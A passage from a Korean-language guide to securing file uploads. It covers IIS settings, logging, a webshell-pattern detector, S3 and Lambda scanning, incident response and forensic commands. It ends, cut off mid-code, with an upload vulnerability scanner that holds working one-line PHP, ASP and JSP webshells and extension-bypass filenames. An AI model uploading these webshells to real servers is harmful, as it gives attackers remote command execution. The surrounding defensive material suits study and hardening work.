#### 4.4.3. IIS 보안 설정
```xml
<!-- web.config 설정 -->
<configuration>
    <system.webServer>
        <!-- 업로드 크기 제한 -->
        <security>
            <requestFiltering>
                <requestLimits maxAllowedContentLength="10485760" />
                <fileExtensions>
                    <!-- 위험한 확장자 차단 -->
                    <add fileExtension=".php" allowed="false" />
                    <add fileExtension=".asp" allowed="false" />
                    <add fileExtension=".aspx" allowed="false" />
                    <add fileExtension=".jsp" allowed="false" />
                    <add fileExtension=".exe" allowed="false" />
                </fileExtensions>
            </requestFiltering>
        </security>
        
        <!-- 업로드 디렉토리 스크립트 실행 차단 -->
        <location path="uploads">
            <system.webServer>
                <handlers>
                    <clear />
                    <add name="StaticFile" path="*" verb="GET" 
                         modules="StaticFileModule" resourceType="Either" />
                </handlers>
            </system.webServer>
        </location>
        
        <!-- 보안 헤더 -->
        <httpProtocol>
            <customHeaders>
                <add name="X-Content-Type-Options" value="nosniff" />
                <add name="X-Frame-Options" value="DENY" />
            </customHeaders>
        </httpProtocol>
    </system.webServer>
</configuration>
```

### 4.5. 모니터링 및 로깅

#### 4.5.1. 파일 업로드/다운로드 로깅
```python
import logging
import json
from datetime import datetime

class FileActivityLogger:
    def __init__(self, log_file='file_activity.log'):
        logging.basicConfig(
            filename=log_file,
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        self.logger = logging.getLogger(__name__)
    
    def log_upload_attempt(self, user_id, filename, file_size, 
                          ip_address, user_agent, success, reason=None):
        log_data = {
            'action': 'upload',
            'user_id': user_id,
            'filename': filename,
            'file_size': file_size,
            'ip_address': ip_address,
            'user_agent': user_agent,
            'success': success,
            'reason': reason,
            'timestamp': datetime.now().isoformat()
        }
        
        if success:
            self.logger.info(f"File upload success: {json.dumps(log_data)}")
        else:
            self.logger.warning(f"File upload blocked: {json.dumps(log_data)}")
    
    def log_download_attempt(self, user_id, filename, ip_address, 
                           success, file_path=None):
        log_data = {
            'action': 'download',
            'user_id': user_id,
            'filename': filename,
            'file_path': file_path,
            'ip_address': ip_address,
            'success': success,
            'timestamp': datetime.now().isoformat()
        }
        
        if success:
            self.logger.info(f"File download: {json.dumps(log_data)}")
        else:
            self.logger.warning(f"File download blocked: {json.dumps(log_data)}")
    
    def detect_suspicious_activity(self, user_id, ip_address):
        # 최근 1분간 실패한 시도 횟수 확인
        recent_failures = self.count_recent_failures(user_id, ip_address, 60)
        
        if recent_failures > 5:
            self.logger.critical(f"Suspicious file activity detected - "
                               f"User: {user_id}, IP: {ip_address}, "
                               f"Failures: {recent_failures}")
            return True
        return False
```

#### 4.5.2. 실시간 위협 탐지
```python
import re
import hashlib

class FileUploadThreatDetector:
    def __init__(self):
        self.webshell_patterns = [
            rb'system\s*\(\s*\$_',
            rb'eval\s*\(\s*\$_',
            rb'exec\s*\(\s*\$_',
            rb'shell_exec\s*\(\s*\$_',
            rb'passthru\s*\(\s*\$_',
            rb'base64_decode\s*\(',
            rb'<%\s*eval\s*request',
            rb'Runtime\.getRuntime\(\)\.exec',
        ]
        
        self.suspicious_extensions = [
            'php', 'php3', 'php4', 'php5', 'phtml',
            'asp', 'aspx', 'jsp', 'py', 'pl', 'sh'
        ]
        
        self.known_malware_hashes = set()  # 알려진 악성 파일 해시
    
    def analyze_uploaded_file(self, file_path, original_filename):
        threats = []
        
        # 1. 파일 확장자 검사
        extension = original_filename.split('.')[-1].lower()
        if extension in self.suspicious_extensions:
            threats.append(f"Suspicious extension: {extension}")
        
        # 2. 파일 내용 패턴 검사
        with open(file_path, 'rb') as f:
            content = f.read()
            
            for pattern in self.webshell_patterns:
                if re.search(pattern, content, re.IGNORECASE):
                    threats.append(f"Webshell pattern detected: {pattern}")
        
        # 3. 파일 해시 검사
        file_hash = hashlib.sha256(content).hexdigest()
        if file_hash in self.known_malware_hashes:
            threats.append(f"Known malware hash: {file_hash}")
        
        # 4. 파일 크기 이상 여부
        if len(content) < 100 and any(pattern in content for pattern in [b'<?php', b'<%']):
            threats.append("Suspicious small script file")
        
        return {
            'threats_detected': len(threats) > 0,
            'threat_details': threats,
            'file_hash': file_hash,
            'risk_level': self.calculate_risk_level(threats)
        }
    
    def calculate_risk_level(self, threats):
        if any('webshell' in threat.lower() for threat in threats):
            return 'HIGH'
        elif any('suspicious' in threat.lower() for threat in threats):
            return 'MEDIUM'
        elif threats:
            return 'LOW'
        else:
            return 'NONE'
```

### 4.6. 클라우드 환경 보안 설정

#### 4.6.1. AWS S3 보안 설정
```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "DenyDirectAccess",
            "Effect": "Deny",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::upload-bucket/*",
            "Condition": {
                "StringNotEquals": {
                    "aws:SourceVpce": "vpce-12345678"
                }
            }
        },
        {
            "Sid": "AllowOnlySpecificFileTypes",
            "Effect": "Allow",
            "Principal": {
                "AWS": "arn:aws:iam::123456789012:role/UploadRole"
            },
            "Action": "s3:PutObject",
            "Resource": "arn:aws:s3:::upload-bucket/*",
            "Condition": {
                "StringLike": {
                    "s3:x-amz-content-sha256": "*"
                },
                "StringEquals": {
                    "s3:x-amz-server-side-encryption": "AES256"
                }
            }
        }
    ]
}
```

#### 4.6.2. 파일 스캔 자동화 (AWS Lambda)
```python
import boto3
import json

def lambda_handler(event, context):
    s3_client = boto3.client('s3')
    
    # S3 이벤트에서 파일 정보 추출
    bucket = event['Records'][0]['s3']['bucket']['name']
    key = event['Records'][0]['s3']['object']['key']
    
    try:
        # 파일 다운로드
        response = s3_client.get_object(Bucket=bucket, Key=key)
        file_content = response['Body'].read()
        
        # 악성 파일 패턴 검사
        malicious_patterns = [
            b'<?php',
            b'<%eval',
            b'system(',
            b'shell_exec(',
            b'base64_decode('
        ]
        
        threats_found = []
        for pattern in malicious_patterns:
            if pattern in file_content:
                threats_found.append(pattern.decode('utf-8', errors='ignore'))
        
        if threats_found:
            # 악성 파일 격리
            quarantine_bucket = 'quarantine-bucket'
            s3_client.copy_object(
                CopySource={'Bucket': bucket, 'Key': key},
                Bucket=quarantine_bucket,
                Key=f"quarantine/{key}"
            )
            
            # 원본 파일 삭제
            s3_client.delete_object(Bucket=bucket, Key=key)
            
            # 알림 발송
            sns_client = boto3.client('sns')
            sns_client.publish(
                TopicArn='arn:aws:sns:region:account:security-alerts',
                Message=f"Malicious file detected and quarantined: {key}\nThreats: {threats_found}",
                Subject="Security Alert: Malicious File Upload"
            )
            
        return {
            'statusCode': 200,
            'body': json.dumps({
                'message': 'File scan completed',
                'threats_found': len(threats_found),
                'quarantined': len(threats_found) > 0
            })
        }
        
    except Exception as e:
        print(f"Error processing file {key}: {str(e)}")
        return {
            'statusCode': 500,
            'body': json.dumps({'error': str(e)})
        }
```

### 4.7. 사고 대응 절차

#### 4.7.1. 악성 파일 업로드 탐지 시 대응
```markdown
## 즉시 대응 (0-30분)
1. 악성 파일 격리
   - 파일 접근 권한 즉시 제거 (chmod 000)
   - 파일을 격리 디렉토리로 이동
   - 웹 서버에서 해당 파일 접근 차단

2. 영향 범위 확인
   - 업로드된 파일의 접근 로그 분석
   - 같은 IP/사용자의 다른 업로드 파일 점검
   - 시스템 프로세스 및 네트워크 연결 모니터링

3. 추가 공격 차단
   - 공격자 IP 즉시 차단
   - 파일 업로드 기능 임시 비활성화
   - 웹쉘 시그니처 기반 모니터링 강화
```

#### 4.7.2. 포렌식 조사
```bash
# 파일 시스템 분석
find /var/www/ -name "*.php" -mtime -1 -exec ls -la {} \;
find /uploads/ -type f -newer /tmp/reference_time

# 프로세스 분석
ps aux | grep -E "(php|python|perl|sh|bash)"
netstat -tulpn | grep LISTEN

# 로그 분석
grep -i "POST.*upload" /var/log/apache2/access.log
grep -E "(\.php|\.asp|\.jsp)" /var/log/nginx/access.log
tail -f /var/log/syslog | grep -i upload

# 파일 무결성 검사
rpm -Va  # RedHat/CentOS
debsums -c  # Debian/Ubuntu
tripwire --check  # Tripwire 사용 시
```

### 4.8. 자동화 도구 및 스크립트

#### 4.8.1. 파일 업로드 취약점 스캔
```python
import requests
import os

class FileUploadScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        
    def test_file_upload_vulnerabilities(self):
        test_files = [
            ('shell.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php'),
            ('shell.asp', '<%eval request("cmd")%>', 'application/x-asp'),
            ('shell.jsp', '<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>', 'application/x-jsp'),
            ('test.php%00.jpg', '<?php phpinfo(); ?>', 'image/jpeg'),
            ('test.jpg', 'GIF89a<?php system($_GET["cmd"]); ?>', 'image/gif')
        ]
        
        results = []
        
        for filename, content, content_type in test_files:
            try:
                files = {
                    'file': (filename, content, content_type)
                }
                
                response = self.session.post(f"{self.target_url}/upload", files=files)
                
                # 업로드 성공 여부 확인
                if response.status_code == 200 and 'success' in response.text.lower():
                    # 업로드된 파일 실행 테스트
                    if self.test_file_execution(filename):
                        results.append({
                            'filename': filename,
                            'status': 'VULNERABLE',
                            'details': 'File uploaded and executable'
                        })
                    else:
                        results.append({
                            'filename': filename,
                            'status': 'UPLOADED',
                            'details': 'File uploaded but not executable'
                        })
                else:
                    results.append({
                        'filename': filename,
                        'status': 'BLOCKED',
